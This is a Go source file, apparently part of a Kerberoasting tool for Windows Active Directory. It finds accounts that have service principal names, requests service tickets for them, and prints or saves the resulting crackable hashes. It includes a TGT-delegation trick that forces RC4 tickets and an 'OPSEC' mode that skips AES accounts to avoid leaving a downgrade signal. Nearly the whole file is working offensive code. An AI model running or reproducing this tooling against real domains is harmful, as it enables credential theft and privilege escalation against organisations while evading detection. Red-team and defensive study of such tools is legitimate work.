//go:build windows
// +build windows

package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
)

// Config holds the resolved options for a roasting run.
type Config struct {
	Method      string // "ldap" or "adws"
	User        string
	Domain      string
	DC          string
	SPN         string
	OutFile     string
	UseLDAPS    bool
	StatsOnly   bool
	ExtraFilter string
	TGTDeleg    bool // use the TGT-delegation trick to request RC4 tickets
	RC4OpSec    bool // only target RC4-capable, AES-incapable accounts (no downgrade signal)

	// deleg holds the forwarded TGT extracted via the delegation trick, lazily
	// populated on first use when TGTDeleg is set.
	deleg *delegTGT
}

// enumerate dispatches roastable-user discovery to the selected backend.
func enumerate(cfg *Config) ([]roastTarget, error) {
	switch cfg.Method {
	case "ldap":
		return searchRoastableUsersLDAP(cfg)
	case "adws":
		return searchRoastableUsersADWS(cfg)
	default:
		return nil, fmt.Errorf("an enumeration method is required: pass -method ldap or -method adws")
	}
}

// roastTarget is one account to roast.
type roastTarget struct {
	SAMAccountName    string
	DistinguishedName string
	SPN               string
	PwdLastSet        string
	SupportedETypes   string
}

// Run performs the full kerberoast workflow.
func Run(cfg *Config) error {
	// Enumeration is required unless a single explicit SPN was given. In that
	// case the operator must choose how to query the directory.
	if cfg.SPN == "" && cfg.Method != "ldap" && cfg.Method != "adws" {
		return fmt.Errorf("an enumeration method is required: pass -method ldap or -method adws (or target one -spn)")
	}

	if err := resolveDomainAndDC(cfg); err != nil {
		return err
	}

	// When tgtdeleg is requested, extract the user's forwarded TGT up front so
	// every subsequent roast reuses it.
	if cfg.TGTDeleg {
		fmt.Print("[*] Using the TGT-delegation trick to request RC4 service tickets\r\n")
		tgt, err := extractDelegTGT(cfg)
		if err != nil {
			return fmt.Errorf("tgtdeleg: %w", err)
		}
		cfg.deleg = tgt
		fmt.Printf("[*] Recovered a usable TGT for %s\\%s\r\n", strings.ToUpper(cfg.Domain), tgt.UserName)
	}

	// Single explicit SPN: no LDAP needed, just roast it directly.
	if cfg.SPN != "" {
		fmt.Printf("[*] Target SPN             : %s\r\n\r\n", cfg.SPN)
		t := roastTarget{SAMAccountName: "USER", SPN: cfg.SPN}
		return roastOne(cfg, t)
	}

	fmt.Printf("[*] Target Domain          : %s\r\n", cfg.Domain)
	fmt.Printf("[*] Target DC              : %s\r\n", cfg.DC)
	if cfg.User != "" {
		fmt.Printf("[*] Target User            : %s\r\n", cfg.User)
	}
	if cfg.RC4OpSec {
		fmt.Print("[*] OPSEC                  : skipping AES-advertising accounts (no RC4-downgrade signal)\r\n")
	}

	targets, err := enumerate(cfg)
	if err != nil {
		return err
	}

	if len(targets) == 0 {
		fmt.Print("\r\n[X] No users found to Kerberoast!\r\n")
		return nil
	}
	fmt.Printf("\r\n[*] Total kerberoastable users : %d\r\n", len(targets))

	if cfg.StatsOnly {
		printStats(targets)
		return nil
	}

	for _, t := range targets {
		fmt.Printf("\r\n[*] SamAccountName         : %s\r\n", t.SAMAccountName)
		fmt.Printf("[*] DistinguishedName      : %s\r\n", t.DistinguishedName)
		fmt.Printf("[*] ServicePrincipalName   : %s\r\n", t.SPN)
		if t.PwdLastSet != "" {
			fmt.Printf("[*] PwdLastSet             : %s\r\n", t.PwdLastSet)
		}
		if t.SupportedETypes != "" {
			fmt.Printf("[*] Supported ETypes       : %s\r\n", t.SupportedETypes)
		}
		if err := roastOne(cfg, t); err != nil {
			fmt.Printf("\r\n[X] Error roasting %s : %v\r\n", t.SAMAccountName, err)
		}
	}

	if cfg.OutFile != "" {
		abs, _ := filepath.Abs(cfg.OutFile)
		fmt.Printf("\r\n[*] Roasted hashes written to : %s\r\n", abs)
	}
	return nil
}

// roastOne requests a service ticket for the target's SPN and emits the hash.
//
// With -tgtdeleg, the ticket is requested over the wire with the forwarded TGT
// while demanding RC4-HMAC, yielding an etype-23 hash. Otherwise the current
// Windows logon session (SSPI) is used, which honours the account's configured
// encryption types.
func roastOne(cfg *Config, t roastTarget) error {
	var (
		hash string
		err  error
	)
	if cfg.deleg != nil {
		hash, err = getTGSRepHashDeleg(cfg.deleg, t.SPN, t.SAMAccountName)
	} else {
		hash, err = getTGSRepHash(t.SPN, t.SAMAccountName, cfg.Domain)
	}
	if err != nil {
		return err
	}
	return emitHash(cfg.OutFile, hash)
}

// emitHash prints a hash or appends it to the configured output file.
func emitHash(outFile, hash string) error {
	if outFile == "" {
		fmt.Printf("[*] Hash                   : %s\r\n", hash)
		return nil
	}
	f, err := os.OpenFile(outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return err
	}
	defer f.Close()
	if _, err := f.WriteString(hash + "\r\n"); err != nil {
		return err
	}
	return nil
}

// resolveDomainAndDC fills in any missing domain / DC from the environment and DNS.
func resolveDomainAndDC(cfg *Config) error {
	if cfg.Domain == "" {
		cfg.Domain = os.Getenv("USERDNSDOMAIN")
	}
	if cfg.Domain == "" {
		return fmt.Errorf("could not determine domain; specify -domain (machine may not be domain-joined)")
	}
	cfg.Domain = strings.ToLower(cfg.Domain)

	if cfg.DC == "" {
		dc, err := discoverDC(cfg.Domain)
		if err != nil {
			return fmt.Errorf("could not auto-discover a domain controller for %q (specify -dc): %w", cfg.Domain, err)
		}
		cfg.DC = dc
	}
	return nil
}

// discoverDC resolves a domain controller hostname for the domain via the
// standard _ldap._tcp SRV record.
func discoverDC(domain string) (string, error) {
	_, addrs, err := net.LookupSRV("ldap", "tcp", domain)
	if err != nil {
		return "", err
	}
	if len(addrs) == 0 {
		return "", fmt.Errorf("no _ldap._tcp.%s SRV records", domain)
	}
	return strings.TrimSuffix(addrs[0].Target, "."), nil
}

// printStats summarises supported encryption types across the targets.
func printStats(targets []roastTarget) {
	etypeCounts := map[string]int{}
	for _, t := range targets {
		key := t.SupportedETypes
		if key == "" {
			key = "not defined (RC4)"
		}
		etypeCounts[key]++
	}
	fmt.Print("\r\n[*] Supported Encryption Type counts:\r\n")
	for k, v := range etypeCounts {
		fmt.Printf("    %-40s : %d\r\n", k, v)
	}
}
